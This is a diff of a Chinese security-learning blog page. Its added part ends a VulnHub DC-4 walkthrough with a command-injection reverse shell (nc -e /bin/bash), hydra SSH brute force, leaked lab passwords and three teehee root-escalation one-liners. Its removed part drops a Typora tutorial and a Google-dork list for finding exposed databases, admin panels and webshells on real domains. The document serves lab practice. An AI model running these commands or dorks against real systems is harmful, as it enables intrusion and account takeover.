+<p>这里注意，要先在kali机上输入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 520</span><br></pre></td></tr></table></figure>
+
+<p>再在burp上构造</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc+192.168.1.10+520+-e+/bin/bash&amp;submit=Run #这里burp将空格处理为+号</span><br></pre></td></tr></table></figure>
+
+
+
+<p>几次尝试之后，成了！</p>
+<p><img src="/../images/image-20210217025027254.png" alt="image-20210217025027254"></p>
+<p>这个shell不好康，参考第一篇DC-1博文，转换成交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在找一下所有有x权限的命令结果列一下以待后用。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20210217033214885.png" alt="image-20210217033214885"></p>
+<p>同时，在&#x2F;home中发现了三个用户，但只有jim用户有相关的文件信息，其中有一个密码本可以利用！</p>
+<p><img src="/../images/image-20210217033348174.png" alt="image-20210217033348174"></p>
+<p>那接下来就是ssh爆破喽，hydra的ssh确实有点慢。。。但还是得到了其账号密码<code>jim:jibril04</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P xxx.txt ssh://192.168.1.11</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/image-20210217034346783.png" alt="image-20210217034346783"></p>
+<p>登录的时候出现了一点bug。。。ssh登录给我发了<strong>Host key verification failed</strong>的错误，查了点资料才找到原因，参考这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/ouyang_peng/article/details/83115290">我是链接</a>。这么严格是为了防止中间人攻击。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f &quot;/root/.ssh/known_hosts&quot; -R &quot;192.168.1.11&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如上命令删除本地保存的信息，再登录。</p>
+<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p><img src="/../images/image-20210217040403957.png" alt="image-20210217040403957"></p>
+<p>jim的有用信息，，估计就一个mbox。ok，这应该是封邮件，果然，在<code>/var/mail</code>里发现了属于jim的一封邮件</p>
+<p><img src="/../images/image-20210217040639325.png" alt="image-20210217040639325"></p>
+<p>直接告诉了我们另一个人的账户密码，那就换成他的壳<code>charles:^xHhA&amp;hvim0y</code>。用这个账户查看<strong>sudo</strong>权限配置。</p>
+<p><img src="/../images/image-20210217040953109.png" alt="image-20210217040953109"></p>
+<p>出现了！上次是git这次是teehee。查找了一些teehee提权方式如下</p>
+<h3 id="第一种，直接添加root权限的无密码账户"><a href="#第一种，直接添加root权限的无密码账户" class="headerlink" title="第一种，直接添加root权限的无密码账户"></a>第一种，直接添加root权限的无密码账户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二种，定时任务执行脚本提权"><a href="#第二种，定时任务执行脚本提权" class="headerlink" title="第二种，定时任务执行脚本提权"></a>第二种，定时任务执行脚本提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* * * * * root chmod 4777 /bin/sh&quot; | sudo teehee -a /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p>时间部分全部填写为*，这样默认这个定时任务每分钟执行一次，可以根据情况自行设定。通过执行的脚本将&#x2F;bin&#x2F;sh的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</p>
+<h3 id="第三种，写入sudoers文件，使其可以root身份执行所有命令"><a href="#第三种，写入sudoers文件，使其可以root身份执行所有命令" class="headerlink" title="第三种，写入sudoers文件，使其可以root身份执行所有命令"></a>第三种，写入sudoers文件，使其可以root身份执行所有命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p>这里我图方便用第一种，在&#x2F;root路径下发现了flag</p>
+<p><img src="/../images/image-20210217041658909.png" alt="image-20210217041658909"></p>
+<hr>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>太依赖爆破啦！QAQ，挺希望能学到一些真正技术性的知识与技巧，比如thm的那个basic pentest</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/02/17/DC4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DC2靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -556,7 +1068,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-pwn</a>
         		</li>
       		
 		</ul>
@@ -596,7 +1108,7 @@
 
 
   
-    <article id="post-web-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-CTF-web-0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -604,7 +1116,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2021/01/28/web-1/" target="_blank">web-1</a>
+	  <a class="article-title" href="/2021/01/28/CTF-web-0/" target="_blank">CTF-web-0</a>
   
     </h1>
   
@@ -612,7 +1124,7 @@
 
   
   
-<a href="/2021/01/28/web-1/" class="archive-article-date">
+<a href="/2021/01/28/CTF-web-0/" class="archive-article-date">
         <time datetime="2021-01-27T17:23:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-28</time>
 </a>
 
@@ -746,7 +1258,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-web</a>
         		</li>
       		
 		</ul>
@@ -756,7 +1268,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2021/01/28/web-1/">展开全文 >></a>
+      <a class="article-more-a" href="/2021/01/28/CTF-web-0/">展开全文 >></a>
     </p>
     
 
@@ -1052,7 +1564,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-misc</a>
         		</li>
       		
 		</ul>
@@ -1396,362 +1908,9 @@
 
 
   
-    <article id="post-Typora自学教程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/01/20/Typora%E8%87%AA%E5%AD%A6%E6%95%99%E7%A8%8B/" target="_blank">Typora自学教程</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/01/20/Typora%E8%87%AA%E5%AD%A6%E6%95%99%E7%A8%8B/" class="archive-article-date">
-        <time datetime="2021-01-20T12:49:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-20</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <center>Typora使用教程</center>
-
-<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>输入  <strong>[toc]</strong>  后按下回车键，可自动提取标题生成目录，如下：</p>
-<p>[toc]</p>
-<p>附带链接形式</p>
-<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><blockquote>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Ctrl+<span class="number">1</span>  一阶标题    Ctrl+B  字体加粗</span><br><span class="line">Ctrl+<span class="number">2</span>  二阶标题    Ctrl+I  字体倾斜</span><br><span class="line">Ctrl+<span class="number">3</span>  三阶标题    Ctrl+U  下划线</span><br><span class="line">Ctrl+<span class="number">4</span>  四阶标题    Ctrl+Home   返回Typora顶部</span><br><span class="line">Ctrl+<span class="number">5</span>  五阶标题    Ctrl+End    返回Typora底部</span><br><span class="line">Ctrl+<span class="number">6</span>  六阶标题    Ctrl+T  创建表格</span><br><span class="line">Ctrl+L  选中某句话   Ctrl+K  创建超链接</span><br><span class="line">Ctrl+D  选中某个单词  Ctrl+F  搜索</span><br><span class="line">Ctrl+E  选中相同格式的文字   Ctrl+H  搜索并替换</span><br><span class="line">Alt+Shift+<span class="number">5</span> 删除线 Ctrl+Shift+I    插入图片</span><br><span class="line">Ctrl+Shift+M    公式块 Ctrl+Shift+Q    引用</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>使用<strong>&gt; + 空格键+文字</strong>（注意要加“\”符号才能防止转意）或者使用快捷键  <strong>ctrl + shift + Q</strong> </p>
-<h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>使用<strong>1+.+空格键</strong>自动生成列表，同时<strong>回车</strong>自动下一行，最后按**右键–&gt;**跳出。</p>
-<ol>
-<li>just</li>
-<li>like</li>
-<li>this</li>
-</ol>
-<h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>三个键可以创建  *****  或  <strong>+</strong>  或者  <strong>-</strong>  都可以，同样要加<strong>空格键</strong></p>
-<ul>
-<li>just</li>
-<li>like</li>
-<li>this</li>
-</ul>
-<h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a>插入代码</h2><p>三种方式：使用  <strong>&#96;&#96;&#96;</strong>  (~键)加回车之后再选择语言即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;I love you&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="数学表达式"><a href="#数学表达式" class="headerlink" title="数学表达式"></a>数学表达式</h2><p>使用  <strong>$$</strong>  再按回车键，最后末尾结束要补上  <strong>$$</strong>  (Latex写法)</p>
-<p>例子如下：<br>$$<br>\mathbf{V}_1\times\mathbf{V}_2 &#x3D; \mathbf{V}^2_3<br>$$<br>代码如下：</p>
-<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="keyword">\mathbf</span>&#123;V&#125;<span class="built_in">_</span>1<span class="keyword">\times</span><span class="keyword">\mathbf</span>&#123;V&#125;<span class="built_in">_</span>2 = <span class="keyword">\mathbf</span>&#123;V&#125;<span class="built_in">^</span>2<span class="built_in">_</span>3</span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a>插入表格</h2><p>输入方式：**| ID | Password |**  例子如下：</p>
-<table>
-<thead>
-<tr>
-<th>ID</th>
-<th>Password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<ol>
-<li><p>多列可用  <strong>|</strong>  符号隔开</p>
-</li>
-<li><p>对齐方式</p>
-<ul>
-<li>左对齐   </li>
-<li>右对齐</li>
-<li>居中对齐</li>
-</ul>
-</li>
-<li><p>用  <strong>|</strong>  分隔不同单元行，用  <strong>-</strong>  来分割表头和行，例如(未实现)</p>
-</li>
-</ol>
-<h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><p>脚注加字母数字和下划线即可，如：</p>
-<p>啦啦啦我喜欢[^1]你哇</p>
-<p>具体为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">啦啦啦我喜欢[^1]你哇</span><br></pre></td></tr></table></figure>
-
-<h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~我爱你~~</span><br></pre></td></tr></table></figure>
-
-<p><del>我爱你</del></p>
-<h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[链接名称](url)</span><br></pre></td></tr></table></figure>
-
-<p><a href="justtolove.cf">我的博客</a></p>
-<h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p><img src="/../images/6.jpg" alt="alt 背景"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![alt 属性文本](图片地址)</span><br><span class="line">还可以直接拖拽</span><br></pre></td></tr></table></figure>
-
-<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><ol>
-<li><p>斜体</p>
-<ul>
-<li><strong>*单星号*</strong>  或者  <strong>_单下划线_</strong>  如 <em>斜体</em></li>
-</ul>
-</li>
-<li><p>加粗</p>
-<ul>
-<li><strong>两个星号</strong></li>
-</ul>
-</li>
-<li><p>加粗斜体</p>
-<ul>
-<li><em><strong>三个星号</strong></em></li>
-</ul>
-</li>
-</ol>
-<h2 id="代码标记"><a href="#代码标记" class="headerlink" title="代码标记"></a>代码标记</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &quot;I love you&quot; &gt; /home/xxx/test.txt`</span><br></pre></td></tr></table></figure>
-
-<p><code>echo &quot;I love you&quot; &gt; /home/xxx/test.txt</code></p>
-<h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + U 或者 &lt;u&gt;内容&lt;/u&gt;</span><br></pre></td></tr></table></figure>
-
-<p><u>我爱你</u></p>
-<h2 id="下标与上标"><a href="#下标与上标" class="headerlink" title="下标与上标"></a>下标与上标</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内容&lt;sup&gt;上标&lt;/sup&gt;</span><br></pre></td></tr></table></figure>
-
-<p>X<sup>2</sup></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内容&lt;sub&gt;下标&lt;/sup&gt;</span><br></pre></td></tr></table></figure>
-
-<p>CuSO<sub>4</sub></p>
-<h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>三个***或者三个—再加回车即可</p>
-<hr>
-<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>大致就这些，应该够用了，<del>学了挺多的</del>，最后材料引用连接如下，感谢</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hider/p/11614688.html#fnref1">链接一</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/148825412">连接二</a></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Typora</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/01/20/Typora%E8%87%AA%E5%AD%A6%E6%95%99%E7%A8%8B/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Google-Hack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/01/20/Google-Hack/" target="_blank">Google Hack</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/01/20/Google-Hack/" class="archive-article-date">
-        <time datetime="2021-01-20T12:44:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-20</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <center>Google Hack搜索语句</center>
-
-<h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><h3 id="1-intitle"><a href="#1-intitle" class="headerlink" title="1.intitle"></a><strong>1.intitle</strong></h3><pre><code>intitle语法常常被用来搜索网站后台、特殊页面和文件，通过在Google中搜索**“intitle:登录”**、**“intitle:管理”**就可以找到很多网站的后台登录页面。此外，intitle语法还可以被用在搜索文件上，例如搜索**“intitle:&quot;indexof&quot;etc/shadow”**就可以找到Linux中因为配置不合理而泄露出来的用户密码文件。
-</code></pre>
-<h3 id="2-inurl"><a href="#2-inurl" class="headerlink" title="2.inurl"></a><strong>2.inurl</strong></h3><pre><code>作用分为以下两个方面：**寻找网站后台登录地址，搜索特殊URL**。
-
-与intitle不同，inurl可以指定URL的关键字，许多网站后台URL都是类似“login.asp”，“admin.asp”结尾，所以eg:**“inurl:login.asp”**，**“inurl:admin.asp”**即可，同时，可以搜索网站数据库地址，以**“inurl:data”**，**“inurl:db”**为关键字进行搜索即可。
-
-比如前段日子很火的上传漏洞，我们使用**“inurl:upload.asp”**或**“inurl:upload_soft.asp”**即可找到很多上传页面，此时再用工具进行木马上传就可以完成入侵。
-</code></pre>
-<h3 id="3-intext"><a href="#3-intext" class="headerlink" title="3.intext"></a><strong>3.intext</strong></h3><pre><code>intext的作用是搜索网页中的指定字符，这貌似在Google Hack中没有什么作用，不过在以**“intext:to parent directory”**为关键字进行搜索后，我们会很惊奇的发现，无数网站的目录暴露在我们眼前。我们可以在其中随意切换目录，浏览文件，就像拥有了一个简单的Webshell。形成这种现象的原因是由于IIS的配置疏忽。同样，中文IIS配置疏忽也可能出现类似的漏洞，我们用**“intext:转到父目录”**就可以找到很多有漏洞的中文网站。
-</code></pre>
-<h3 id="4-Filetype"><a href="#4-Filetype" class="headerlink" title="4.Filetype"></a><strong>4.Filetype</strong></h3><pre><code> Filetype的作用是搜索指定文件。假如我们要搜索网站的数据库文件，那么可以以**“filetype:mdb”**为关键字进行搜索，很快就可以下载到不少网站的数据库文件。
-</code></pre>
-<h3 id="5-site"><a href="#5-site" class="headerlink" title="5.site"></a><strong>5.site</strong></h3><pre><code>Site语法可以显示所有和目标网站有联系的页面，从中或多或少存在一些关于目标网站的资料.
-</code></pre>
-<h2 id="组合语句"><a href="#组合语句" class="headerlink" title="组合语句"></a>组合语句</h2><h3 id="1-网站数据库"><a href="#1-网站数据库" class="headerlink" title="1.网站数据库"></a><strong>1.网站数据库</strong></h3><pre><code>**“Site:目标网站&quot;**获取相关网页，之后搜索**“Site:目标网站 Filetype:mdb”**就可以寻找目标网站的数据库，其中的Site语法限定搜索范围，Filetype决定搜索目标。用这种方法有一个缺点，就是下载到数据库的成功率较低。在这里我们还可以采用另一种语法组合，前提是目标网站存在**IIS配置缺陷**，即可以随意浏览站点文件夹，我们搜索**“Site:目标网站 intext:to parent directory”**来确定其是否存在此漏洞。在确定漏洞存在后，可以使用**“Site:目标网站 intext:to parent directory+intext.mdb”**进行数据库的搜索。
-</code></pre>
-<h3 id="2-登陆后台管理"><a href="#2-登陆后台管理" class="headerlink" title="2.登陆后台管理"></a>2.<strong>登陆后台管理</strong></h3><pre><code>下载到数据库后，我们就可以从中找到网站的管理员帐户和密码，并登录网站的后台。对于网站后台的查找，可以使用语法组合**“Site:目标网站 intitle:管理”**或者**“Site:目标网站 inurl:login.asp”**进行搜索，当然我们可以在这里进行联想，以不同的字符进行搜索，这样就有很大的概率可以找到网站的后台管理地址。接下去黑客就可以在后台上传Webshll，进一步提升权限，在此不再阐述。
-</code></pre>
-<h2 id="google黑客搜索语法小结（适于新手）"><a href="#google黑客搜索语法小结（适于新手）" class="headerlink" title="google黑客搜索语法小结（适于新手）"></a>google黑客搜索语法小结（适于新手）</h2><h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><p>intext:关键字 把网页正文内某个关键字作为搜索条件 </p>
-<hr>
-<p> intitle:关键字 把网页标题内某个关键字作为搜索条件 </p>
-<hr>
-<p>inurl:关键字 搜索含有关键字的url地址 </p>
-<hr>
-<p>link:关键字 查找与关键字做了链接的url地址 </p>
-<hr>
-<p>site:域名 返回域名中所有url地址 </p>
-<hr>
-<p>filetype:文件名.后缀名 搜索特定的文件</p>
-<hr>
-<p>*以上是比较有用的几个语法  </p>
-<h3 id="用法例子："><a href="#用法例子：" class="headerlink" title="用法例子："></a>用法例子：</h3><p>一：搜索注入漏洞站点 inurl:asp?id&#x3D;          配合啊D使用 </p>
-<p>二：查找特定网站的注入漏洞 如要找搜狐的注入 site:sohu.com inurl:asp?id&#x3D; 要是找php站的注入只要把asp换成php  </p>
-<p>三：对目标网站的搜索利用 找特定网站管理页面 </p>
-<p>site:网址 intext:管理  </p>
-<p>site:网址 inurl:login(登陆的页面) </p>
-<p>site:网址 intitle:管理  </p>
-<p>查看有无上传页面漏洞：</p>
-<p> site:网址 inurl:file </p>
-<p>site:网址 inurl:load </p>
-<p>四：搜别人留下的webshell </p>
-<p>如输入：绝对路径 输入保存的路径 输入文件的内容 inurl:diy.asp </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> intext</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> intext:管理  </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> inurl:login </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> intitle:管理 </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> inurl:login.asp </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.netindex.asp/">http://www.hybx.netindex.asp</a> inurl:asp?id&#x3D; </p>
-<p>六．网站的目录结构搜索</p>
-<p>Parent directory site：baidu.com</p>
-<p>七.黑客常用的语法</p>
-<p>admin site:edu.cn</p>
-<p>site:sunghsot.cn intext:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</p>
-<p>site:sunghsot.cn intitle:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</p>
-<p>inurl:login&#x2F;admin&#x2F;manage&#x2F;admin_login&#x2F;login_admin&#x2F;system&#x2F;boos&#x2F;master&#x2F;main&#x2F;cms&#x2F;wp-admin&#x2F;sys|managetem|password|username</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:file</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:load</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:php?id&#x3D;</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:asp?id&#x3D;</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:fck</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:ewebeditor</p>
-<p>inurl:ewebeditor|editor|uploadfile|eweb|edit</p>
-<p>intext:to parent directory</p>
-<p>intext:转到父目录&#x2F;转到父路径</p>
-<p>inurl:upload.asp</p>
-<p>inurl:cms&#x2F;data&#x2F;templates&#x2F;images&#x2F;index&#x2F;</p>
-<p>intitle:powered by dedecms</p>
-<p>index of&#x2F;ppt</p>
-<p>Filetype:mdb</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> intext:to parent directory+intext.mdb</p>
-<p>inurl:robots.txt</p>
-<p>intitle:index.of “parent directory” </p>
-<p>留意几种文件：</p>
-<ol>
-<li>.inc   可能包含网站的配置信息，如数据库用户名、密码等。</li>
-<li>.bak   通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。</li>
-<li>.txt或 .sql  一般包含网站运行的sql脚本可能会透露类似数据库结构等信息。</li>
-</ol>
-<p> 特别注意名字为robots.txt的文件。</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Google Hack</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/01/20/Google-Hack/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -1936,6 +2095,30 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">neural network</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">CTF-web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">CTF-pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Log Audit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">CTF-mis</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF-misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">CTFpwn</a>
               </li>
             
             <div class="clearfix"></div>
